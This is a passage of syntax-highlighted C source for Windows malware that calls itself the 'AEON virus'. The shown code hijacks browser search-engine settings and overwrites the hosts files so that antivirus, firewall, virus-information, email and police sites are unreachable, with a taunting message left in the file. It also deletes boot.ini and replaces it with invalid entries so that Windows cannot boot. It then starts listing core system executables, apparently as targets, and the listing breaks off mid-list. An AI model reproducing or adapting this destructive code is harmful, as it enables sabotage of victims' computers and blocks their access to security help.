    </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"User Prefs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Show Default Browser Dialog"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"0"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProfileIni</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Overwrite Name / URL value for 50 Search Engines (Standard 35) */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">51</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">sprintf_s</span><span class="sc10">(</span><span class="sc11">szSearchEngine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Search Engine %i"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc11">szSearchEngine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Name"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AEON"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSearchIni</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc11">szSearchEngine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"URL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AEON"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSearchIni</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Modify hosts and hosts.msn file in %sysdir%\drivers\etc\hosts to make it impossible to connect to most AV related pages */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ModifyHostFile</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szHostFile</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szHostFileMSN</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szHost</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"# Copyright (c) 2006-? SkyOut [Electrical Ordered Freedom]\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#o_O uhoh, your computer has been infected with the AEON virus and yeeha\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#I changed this file to stop you from visiting some helpful sites...\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#I'm evil, right?! Yeah... I know and I will burn in hell, but until then\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#I will go on fucking up some nice shit -_-\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      localhost\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# AntiVirus --- AntiVirus --- AntiVirus\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#======================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.aladdin.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ealaddin.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.asw.cz\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.avira.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.centralcommand.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.clamav.net\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.percomp.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.commandcom.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www1.my-etrust.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ca.com/offices/germany\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ca.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.vet.com.au\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.cybersoft.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.nod32.de/home/home.php\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.nod32.com/home/home.htm\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.f-secure.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.finjan.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.fortinet.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.complex.is/cgi-bin/home_pager\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.gdata.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ravantivirus.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.jakobsoftware.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.grisoft.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.antivir.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.hbedv.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.free-av.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.free-av.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.hauri-europe.com/default.aspx?NAV=000\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.hauri-europe.com/default.aspx?NAV=002\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ikarus-software.at\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.kaspersky.com/de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.kaspersky.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mwti.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.msspl.co.in/index.asp\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mitcom.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.dials.ru/english/home.htm\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mks.com.pl/index-en.html\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.drsolomon.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mcafee-at-home.com/international/germany\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mcafeeathome.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.nai.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.norman.no/de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.norman.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.promus.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.omegas.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.panda-software.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.pandasoftware.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.bitdefender.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.bitdefender.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sophos.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sophos.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sybari.com/default.aspx?alias=de-DE\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sybari.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.symantec.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.symantec.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.trendmicro.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.antivirus.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.virusbuster.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.virusbuster.hu/index.en.ie.shtml\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# Desktop Firewall --- Desktop Firewall --- Desktop Firewall\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#===========================================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.agnitum.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.aladdin.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ealaddin.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.lockdowncorp.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mcafee.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mcafee.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.networkice.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sygate.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.tinysoftware.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.zonelabs.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# AntiTrojan --- AntiTrojan --- AntiTrojan\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#=========================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.anti-trojan.net\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.astonsoft.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      tds.diamondcs.com.au\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.mischel.dhs.org\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.moosoft.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.nsclean.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# VirusInfo --- VirusInfo --- VirusInfo\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#======================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.antivirus-online.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      antivirus.about.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.avien.org\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.eicar.org\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.tu-berlin.de/www/software/hoax.shtml\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.vmyths.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.trojaner-info.de/inhalt.shtml\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.virusbtn.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.wildlist.org\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# Virus Libraries --- Virus Libraries --- Virus Libraries\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#========================================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.europe.datafellows.com/virus-info\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.percomp.de/virusinformationen.html\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ikarus-software.at/portal/modules.php?name=Virenlexikon\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.ravantivirus.com/pages/virus.php\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.symantec.com/avcenter/vinfodb.html\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.sophos.de/virusinfo/analyses\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.trendmicro.com/vinfo\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      vil.nai.com/vil/default.asp\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.viruslist.com/eng/viruslist.asp"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# Email Providers --- Email Providers --- Email Providers\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#========================================================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.web.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.gmx.net\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.lycos.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.arcor.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.freenet.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.yahoo.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.aol.com\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.t-online.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"\r\n"</span><span class="sc0">
                    </span><span class="sc6">"# Police --- Police --- Police\r\n"</span><span class="sc0">
                    </span><span class="sc6">"#=============================\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.fbi.gov\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.interpol.int\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.cia.gov\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.polizei.de\r\n"</span><span class="sc0">
                    </span><span class="sc6">"127.0.0.1      www.bka.de\r\n"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* %sysdir%\drvers\etc\hosts */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szHostFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHostFile</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szHostFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\drivers\\etc\\hosts"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* %sysdir%\drvers\etc\hosts.msn */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szHostFileMSN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHostFileMSN</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szHostFileMSN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\drivers\\etc\\hosts.msn"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Overwrite both files */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szHostFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szHost</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHost</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szHostFileMSN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szHost</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHost</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Overwrite the boot.ini file on the system drive, which will result in an error message before loading the bootloader next time,
making it not possible to start windows */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DestroyBootIni</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBootIniDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBootIniDir2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* Just deleting boot.ini would not have worked (tested on WIN XP SP1), but only Xing the values, being normally 0 or 1 will
    result in an error message before starting anything (bootloader...) */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBuffer</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[boot loader]\r\n"</span><span class="sc0">
                        </span><span class="sc6">"timeout=30\r\n"</span><span class="sc0">
                        </span><span class="sc6">"default=multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS\r\n"</span><span class="sc0">
                        </span><span class="sc6">"[operating systems]\r\n"</span><span class="sc0">
                        </span><span class="sc6">"multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS=\"Microsoft Windows\" /fastdetect"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Get the location of WINDOWS directory, normally C:\WINDOWS */</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szBootIniDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBootIniDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc1">/* Getting the first three letters, being the system drive, normally C:\ */</span><span class="sc0">
    </span><span class="sc11">strncpy_s</span><span class="sc10">(</span><span class="sc11">szBootIniDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBootIniDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Finally: C:\boot.ini */</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szBootIniDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"boot.ini"</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc1">/* First delete the file */</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szBootIniDir2</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create the new one with our modified text */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szBootIniDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBuffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* A list of almost all important (and most SFC protected) files in %sysdir% and %windir% */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FileNameList</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"explorer.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"notepad.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regedit.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winhelp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmd.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"accwiz.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"actmovie.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ahui.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"alg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"arp.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"at.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"atmadm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"attrib.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"auditusr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"autochk.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"autoconv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"autofmt.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"autolfn.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bootok.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bootvrfy.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cacls.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"calc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"charmap.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"chkdsk.exe"</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc6">"chkntfs.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cidaemon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cisvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ckcnv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cleanmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cliconfg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"clipbrd.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"clipsrv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmdl32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmmon32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmstp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"comp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"compact.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"control.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"convert.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"cscript.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ctfmon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dcomcnfg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ddeshare.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"debug.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"defrag.exe"</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc6">"dfrgfat.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dfrgntfs.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"diantz.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"diskpart.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"diskperf.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dllhost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dmadmin.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"dmremote.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"doskey.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dosx.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dplaysvr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dpnsvr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dpvsetup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"drmupgds.exe"</span><span class="sc10">,</span><span class="sc0">
